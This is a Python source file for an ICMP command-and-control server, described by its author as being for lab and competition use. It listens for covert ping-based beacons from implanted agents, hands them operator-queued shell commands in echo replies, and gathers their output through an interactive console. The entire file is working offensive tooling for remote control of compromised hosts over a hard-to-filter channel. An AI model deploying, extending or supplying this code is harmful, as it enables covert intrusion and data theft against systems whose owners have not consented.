"""
Author: Miller Swank
Date: 2025-09-24
Description: ICMP C2 server for educational cybersecurity testing and competitions (unencrypted).
             Handles agent beacons, command queueing, and result collection. 
             Requires root to sniff/send raw ICMP.
Note: For lab/competition purposes only. Do not run in production environments.
"""

#!/usr/bin/env python3

from scapy.all import *
import threading
import time
import os

C2_IP = "192.168.10.50"  # Your C2 server IP
MAX_CLIENTS = 20
COMMANDS = {}    # agent_id -> list of queued commands
RESULTS = {}     # agent_id -> list of (seq, data) results
ACTIVE_AGENTS = set()
AGENT_INFO = {}  # agent_id -> {'ip': ip_str, 'hostname': host_str}
LAST_SEEN = {}   # agent_id -> last beacon timestamp
INACTIVITY_TIMEOUT = 10  # seconds before agent considered stale

lock = threading.Lock()

def find_agent_by_identifier(identifier):
    """
    Resolve an identifier which may be:
      - exact agent_id
      - IPv4 address string that matches a known agent
      - hostname that matches a known agent
    Returns the agent_id if found, otherwise None.
    """
    with lock:
        # direct match to agent id
        if identifier in ACTIVE_AGENTS:
            return identifier
        # match by IP or hostname
        for aid, info in AGENT_INFO.items():
            if not info:
                continue
            ip = info.get('ip')
            host = info.get('hostname')
            if identifier == ip or identifier == host:
                return aid
    return None

def handle_request(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and Raw in pkt:
        payload = pkt[Raw].load.decode(errors="ignore")
        fields = payload.split("|", 3)

        if len(fields) < 4:
            return

        agent_id, msg_type, seq_str, data = fields
        agent_id = agent_id.strip()
        msg_type = msg_type.strip()
        data = data.strip()
        src_ip = pkt[IP].src
        try:
            seq = int(seq_str)
        except:
            seq = 0

        with lock:
            # register/refresh agent
            ACTIVE_AGENTS.add(agent_id)
            LAST_SEEN[agent_id] = time.time()

            # update AGENT_INFO: store latest IP and hostname (if provided in BEACON data)
            info = AGENT_INFO.get(agent_id, {'ip': src_ip, 'hostname': None})
            info['ip'] = src_ip
            # If beacon provides a hostname (client can include it in data), record it.
            # We treat the data field on BEACON as hostname if non-empty.
            if msg_type == "BEACON" and data:
                info['hostname'] = data
            AGENT_INFO[agent_id] = info

            if msg_type == "BEACON":
                # Send next queued command or NO_CMD
                cmd_list = COMMANDS.get(agent_id, [])
                if cmd_list:
                    next_cmd = cmd_list.pop(0)
                    reply_payload = f"{agent_id}|CMD|0|{next_cmd}"
                else:
                    reply_payload = f"{agent_id}|NO_CMD|0|"
                send(IP(dst=src_ip)/ICMP(type=0)/reply_payload, verbose=0)

            elif msg_type == "RESULT":
                RESULTS.setdefault(agent_id, []).append((seq, data))
                reply_payload = f"{agent_id}|ACK|{seq}|"
                send(IP(dst=src_ip)/ICMP(type=0)/reply_payload, verbose=0)

            elif msg_type == "EXIT":
                # client graceful deregistration
                if agent_id in ACTIVE_AGENTS:
                    ACTIVE_AGENTS.remove(agent_id)
                LAST_SEEN.pop(agent_id, None)
                AGENT_INFO.pop(agent_id, None)
                COMMANDS.pop(agent_id, None)
                RESULTS.pop(agent_id, None)
                # send ACK
                reply_payload = f"{agent_id}|ACK|0|"
                send(IP(dst=src_ip)/ICMP(type=0)/reply_payload, verbose=0)
                print(f"[EXIT] Agent {agent_id} deregistered (graceful).")

def operator_console():
    print("[*] Operator console ready. Type 'help' for commands.")
    while True:
        try:
            cmd_line = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            os._exit(0)

        if not cmd_line:
            continue

        parts = cmd_line.split(" ", 2)
        cmd = parts[0].lower()

        if cmd == "help":
            print("Commands:")
            print("  list                         - List active agents (shows id, ip, hostname, age)")
            print("  info <id|ip|hostname>        - Show detailed info for an agent")
            print("  task <id|ip|hostname> <cmd>  - Queue a command for an agent")
            print("  results <id|ip|hostname>     - Show results from an agent")
            print("  exit                         - Stop the server")
            continue

        if cmd == "list":
            with lock:
                now = time.time()
                # Lazy prune stale agents
                for agent in list(ACTIVE_AGENTS):
                    if now - LAST_SEEN.get(agent, 0) > INACTIVITY_TIMEOUT:
                        ACTIVE_AGENTS.remove(agent)
                        LAST_SEEN.pop(agent, None)
                        COMMANDS.pop(agent, None)
                        RESULTS.pop(agent, None)
                        AGENT_INFO.pop(agent, None)
                        print(f"[PRUNE] Removed stale agent {agent}")

                if not ACTIVE_AGENTS:
                    print("No active agents.")
                else:
                    print("[*] Active agents:")
                    for agent in sorted(ACTIVE_AGENTS):
                        info = AGENT_INFO.get(agent, {})
                        ip = info.get('ip', 'unknown')
                        host = info.get('hostname', 'unknown')
                        age = int(now - LAST_SEEN.get(agent, now))
                        print(f" - id={agent} ip={ip} host={host} age={age}s")
            continue

        if cmd == "info":
            if len(parts) < 2:
                print("Usage: info <agent_id|ip|hostname>")
                continue
            identifier = parts[1]
            aid = find_agent_by_identifier(identifier)
            if not aid:
                print("No such agent.")
                continue
            with lock:
                info = AGENT_INFO.get(aid, {})
                print(f"Agent ID: {aid}")
                print(f"  IP: {info.get('ip', 'unknown')}")
                print(f"  Hostname: {info.get('hostname', 'unknown')}")
                age = int(time.time() - LAST_SEEN.get(aid, time.time()))
                print(f"  Last seen: {age}s ago")
                print(f"  Queued tasks: {len(COMMANDS.get(aid, []))}")
                print(f"  Stored result chunks: {len(RESULTS.get(aid, []))}")
            continue

        if cmd == "task":
            if len(parts) < 3:
                print("Usage: task <agent_id|ip|hostname> <command>")
                continue
            identifier = parts[1]
            command_text = parts[2]
            aid = find_agent_by_identifier(identifier)
            if not aid:
                print("No such agent (or stale).")
                continue
            with lock:
                # optional staleness check
                if time.time() - LAST_SEEN.get(aid, 0) > INACTIVITY_TIMEOUT:
                    print("Agent appears stale — not queueing.")
                    continue
                COMMANDS.setdefault(aid, []).append(command_text)
                # report back which agent id and ip got the task
                ip = AGENT_INFO.get(aid, {}).get('ip', 'unknown')
                print(f"[+] Queued command for id={aid} ip={ip}: {command_text}")
            continue

        if cmd == "results":
            if len(parts) < 2:
                print("Usage: results <agent_id|ip|hostname>")
                continue
            identifier = parts[1]
            aid = find_agent_by_identifier(identifier)
            if not aid:
                print("No such agent.")
                continue
            with lock:
                chunks = sorted(RESULTS.get(aid, []))
                if not chunks:
                    print(f"No results for {aid}")
                    continue
                full_result = "".join(chunk for _, chunk in chunks)
                print(f"--- Results from id={aid} ---")
                print(full_result)
                print("-------------------------------")
                RESULTS[aid] = []
            continue

        if cmd in ("quit", "exit"):
            print("[*] Quitting C2 server.")
            os._exit(0)

        print("Unknown command. Type 'help'.")

def start_c2():
    print("[*] Starting ICMP C2 server...")
    threading.Thread(target=operator_console, daemon=True).start()
    sniff(filter="icmp", prn=handle_request)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Warning: this script typically requires root privileges to send/receive raw ICMP. Run with sudo.")
    start_c2()



